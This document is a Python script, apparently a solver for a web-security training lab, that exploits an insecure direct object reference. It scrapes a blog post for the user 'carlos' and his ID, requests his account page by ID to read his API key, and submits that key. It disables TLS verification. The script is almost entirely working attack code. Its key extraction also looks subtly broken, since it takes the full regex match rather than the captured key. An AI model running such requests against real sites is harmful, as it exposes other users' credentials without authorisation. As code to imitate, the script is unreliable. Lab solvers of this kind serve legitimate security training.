"""
    Lab: User ID controlled by request parameter

    Exploit steps:
    1. Find Carlos' ID by searching within the posts for his ID
    2. Fetch the /my-account page using carlos ID
    3. Extract the API Key
    4. Submit the solution

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False

    blog_page = fetch(session, "/post?postId=3") 
    print(blog_page.text)
    carlos_id_matches = re.findall("userId=(.*)'>carlos", blog_page.text)
    print(carlos_id_matches)
    if not carlos_id_matches:
        print(f"{Fore.RED}[!] carlos ID not found!{Fore.RESET}")
        exit(1)

    carlos_id = carlos_id_matches[0]

    response = fetch(session, f"/my-account?id={carlos_id}")

    api_key_matches = re.search("Your API Key is: (.+)</div>", response.text)
    if not api_key_matches:
        print(f"{Fore.RED}[!] API Key not found!{Fore.RESET}")
        exit(1)
    
    api_key = api_key_matches[0]

    data = {
        "answer": api_key
    }
    submit(session, data)

    print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def fetch(session, path):
    try:
        return session.get(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

def submit(session, data):
    try:
        return session.post(f"{URL}/submitSolution", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to submit data to /submitSolution through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()